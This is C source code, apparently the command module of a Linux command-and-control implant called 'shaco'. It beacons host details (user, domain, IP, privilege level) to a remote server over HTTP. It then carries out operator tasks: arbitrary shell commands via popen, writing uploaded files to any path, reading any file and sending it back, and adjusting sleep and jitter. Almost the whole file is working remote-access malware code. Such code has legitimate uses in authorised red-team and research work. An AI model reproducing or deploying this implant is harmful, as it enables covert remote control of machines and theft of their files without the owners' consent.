#include "Commands.h"
#include "../Common/shaco_stdlib.h"
#include "../Config/Settings.h"
#include "../Config/OSConfig.h"
#include "../Helpers/Http.h"

#include <unistd.h>
#include <limits.h>
#include <fcntl.h>
#include <stdio.h>

enum{
    COMMAND_SHELL = 90,
    COMMAND_CD = 91,
    COMMAND_PWD = 92,
    COMMAND_UPLOAD = 93,
    COMMAND_EXIT = 94,
    COMMAND_SLEEP = 95,
    COMMAND_JITTER = 96,
    COMMAND_DOWNLOAD = 97,
    COMMAND_CHECKIN = 12,
};

enum{
    RESPONSE_UPLOAD_ERROR = 2,
    RESPONSE_UPLOAD_SUCCESS = 1,
    RESPONSE_DOWNLOAD_ERROR = 2,
    RESPONSE_DOWNLOAD_SUCCESS = 1,
    RESPONSE_DOWNLOAD_NO_VALUE = 3
};

#define READ_SIZE 1024


char *strip_end(char *str) {
    int i;
    int len = StringLength(str);
    
    for (i = len - 1; i >= 0; i--) {
        if (str[i] != ' ' && str[i] != '\n') {
            break;
        }
    }
    
    str[i + 1] = '\0';
    return str;
}

PPACKER shell_command(uint8_t *args);
PPACKER checkin_command(uint8_t *args);
PPACKER cd_command(uint8_t *args);
PPACKER pwd_command(uint8_t *args);
PPACKER upload_command(uint8_t *args);
PPACKER exit_command(uint8_t *args);
PPACKER sleep_command(uint8_t *args);
PPACKER jitter_command(uint8_t *args);
PPACKER download_command(uint8_t *args);

COMMAND commands[] = {
    {
        .id  = COMMAND_SHELL,
        .fun = shell_command
    },
    {
        .id = COMMAND_CHECKIN,
        .fun = checkin_command
    },
    {
        .id = COMMAND_CD,
        .fun = cd_command
    },
    {
        .id = COMMAND_PWD,
        .fun = pwd_command
    },
    {
        .id = COMMAND_EXIT,
        .fun = exit_command
    },
    {
        .id = COMMAND_SLEEP,
        .fun = sleep_command
    },
    {
        .id = COMMAND_UPLOAD,
        .fun = upload_command
    },
    {
        .id = COMMAND_DOWNLOAD,
        .fun = download_command
    },
    {
        .id = COMMAND_JITTER,
        .fun = jitter_command
    },
    {
        .id  = -1,
        .fun = NULL
    }
};

PPACKER exec_command(uint8_t *args, int id){
    for(int i = 0; commands[i].id != -1; ++i){
        if(commands[i].id == id){
            MSG("Calling function id: %d", id);
            PPACKER pack = commands[i].fun(args + sizeof(int32_t));
            MSG("command called");
            return pack;
        }
    }
    MSG("command not found: %d", id);
    return NULL; 
}

bool checkin(){
    MSG("shaco initializing");
    bool status = false;

    PSETTINGS sett = get_settings();

    if(!sett) goto EXIT;

    MSG("Gettings OS config");
    POSCONFIG os_config = get_os_config();
    if(!os_config) { MSG("Can'not get config, aborting..."); goto EXIT;}

    PPACKER packer = packer_init();
    packer_add_int32(packer, 0);
    packer_add_int32(packer, SHACO_MAGIC);
    packer_add_int32(packer, sett->agent_id);
    packer_add_int32(packer, COMMAND_CHECKIN);
    packer_add_int32(packer, sett->agent_id);
    packer_add_string(packer, os_config->hostname);
    packer_add_string(packer, os_config->user);
    packer_add_string(packer, os_config->domain);
    packer_add_string(packer, os_config->internal_ip);
    packer_add_int32(packer, os_config->pid);
    packer_add_int32(packer, getppid());
    packer_add_string(packer, os_config->arch);
    packer_add_int32(packer, os_config->elevated);
    packer_add_string(packer, os_config->version);
    packer_add_int32(packer, sett->timeout);
    packer_add_int32(packer, sett->max_timeout);
    
    MSG("Sending Packet Size: %llu", packer_get_size(packer));
    PHTTP_RESPONSE resp = shaco_http_post(packer_get_buffer(packer), packer_get_size(packer));
    if(!resp) { MSG("Error on send http post "); goto EXIT;}

    uint64_t offset = 0;
    
    int command_response = packer_get_int32((uint8_t *)resp->response, &offset);
    if(command_response != COMMAND_OK) { MSG("Command not ok... Response: %s | Command Size: %zu", resp->response, resp->size); goto EXIT;}
    //sett->agent_id = packer_get_int32((uint8_t *)resp->response, &offset);
    MSG("Connected to the server, you id: %d", sett->agent_id);
    status = true;

EXIT:
    if(resp) http_free(resp);
    if(packer) packer_free(packer);
    if(os_config) osconfig_free(os_config);
    return status;
}

PPACKER checkin_command(uint8_t *args){
    MSG("checkin_command");
    checkin();
    return NULL;
}
char *s_exec(char *cmd, size_t *size) {
    if(!cmd) {MSG("no commands passed in parameter"); return NULL;}
    FILE *f = NULL;
    char output[BUFSIZ];
    char *response = NULL;
    size_t current_size = 0;
    size_t offset = 0;

    f = popen(cmd, "r");
    if(!f) {MSG("Error on popen..."); return NULL;}

    MSG("Reading output");
    while(fgets(output,BUFSIZ,f) != NULL){
        size_t len = StringLength(output);
        current_size += len;

        void *tmp = shaco_realloc(response, current_size);
        if(!tmp){
            MSG("error reallocation memory");
            pclose(f);
            if(response) shaco_free(response);
            return NULL;
        }
        response = tmp;
        CopyMemory(response + offset, output, len);
        offset = current_size;
    }
    pclose(f);
    if(size)
        *size = current_size;
    return response;
}

PPACKER shell_command(uint8_t *args){
    uint64_t offset = 0;
    char *command = NULL;
    char *response = NULL;
    command = packer_get_string(args, &offset);

    if(!command) { MSG("No command to execute..."); return NULL;}

    size_t len = 0;
    response = s_exec(command,&len);
    if(!response)
        return NULL;
    
    MSG("shell response: %s", response);

    PPACKER packet = packer_init();
    if(!packet) { shaco_free(response); return NULL;}
    packer_add_data(packet, response, len);
    shaco_free(response);
    return packet;
}


PPACKER cd_command(uint8_t *args){
    uint64_t offset = 0;
    char *path = NULL;
    uint32_t len = 0;

    path = packer_get_string(args, &offset);
    if(!path) {MSG("error in get path string..."); return NULL;}

    strip_end(path);
    
    MSG("moving to path: %s:%zu", path, StringLength(path));

    if(chdir(path) != 0){ MSG("can't change directory: ");}
    return NULL;
}

PPACKER pwd_command(uint8_t *args){
    char pwd[PATH_MAX];
    getcwd(pwd, PATH_MAX);
    PPACKER pack = packer_init();
    packer_add_string(pack, pwd);
    return pack;
}



PPACKER exit_command(uint8_t *args){
    _exit(0); //TODO: change to shaco_exit
    return NULL;
}

PPACKER sleep_command(uint8_t *args){
    PSETTINGS sett = get_settings();
    uint64_t offset = 0;
    uint32_t value = packer_get_int32(args, &offset);
    if(value > 0){
        MSG("Setting sleep to value: %d", value);
        sett->timeout = value;
    }else MSG("Can't set the sleep value to: %d", value);
        return NULL;
}

PPACKER jitter_command(uint8_t *args){
    PSETTINGS sett = get_settings();
    uint64_t offset = 0;
    uint32_t value = packer_get_int32(args, &offset);
    sett->max_timeout = value;
    return NULL;
}


PPACKER upload_command(uint8_t *args){
    uint64_t offset = 0;
    uint64_t data_len = 0;
    char *filepath = packer_get_string(args,&offset);
    void *data = packer_get_data64(args, &data_len, &offset);
    if(!filepath || !data) { MSG("Can't download the file"); return NULL;}

    MSG("Trying download remote file to path: %s | len: %llu", filepath, data_len);

    strip_end(filepath);
    PPACKER pack = packer_init();

    int fd = open(filepath, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd < 0){MSG("can't open filepath %s", filepath); packer_add_int32(pack, RESPONSE_UPLOAD_SUCCESS); return pack;}
    if(write(fd, data, data_len) < 0){
        MSG("can't write on the file");
        packer_add_int32(pack,RESPONSE_UPLOAD_ERROR); 
        return pack;
    }

    close(fd);
    packer_add_int32(pack, RESPONSE_UPLOAD_SUCCESS);
    return pack;
}


PPACKER download_command(uint8_t * args){
    int response = 0;
    uint64_t offset = 0;
    uint8_t *buff = NULL;
    char *file = packer_get_string(args,&offset);
    if(file[StringLength(file) - 1 ] == '\n')
        file[StringLength(file) - 1 ] = '\0';

    PPACKER pack = packer_init();
    int fd = open(file, O_RDONLY);
    if(fd < 0){
        MSG("can't open the file %s", file);
        response = RESPONSE_DOWNLOAD_ERROR;
        goto EXIT;
    }

    size_t nread = 0;
    uint64_t current = 0;
    void *tmp = NULL;
    buff = (uint8_t *)shaco_malloc(READ_SIZE);

    while((nread = read(fd, buff + current, READ_SIZE)) > 0){
        current += nread;
        tmp = shaco_realloc(buff, current + READ_SIZE);
        if(!tmp){
            response = RESPONSE_DOWNLOAD_ERROR;
            goto EXIT;
        }
        buff = tmp;
    }

    if(nread < 0){
        MSG("error in read");
        response = RESPONSE_DOWNLOAD_ERROR;
        goto EXIT;
    }

    if( current <= 0){
        MSG("no value for read");
        response = RESPONSE_DOWNLOAD_NO_VALUE;
        goto EXIT;
    }

    MSG("Sending data for TS");
    response = RESPONSE_DOWNLOAD_SUCCESS;

EXIT:
    packer_add_int32(pack, response);
    if(buff){ 
        if(current > 0){
            packer_add_uint64(pack, current);
            packer_add_data64(pack, buff, current);
        }
        shaco_free(buff); 
    } 
    if(fd >= 0) close(fd);
    return pack;
}
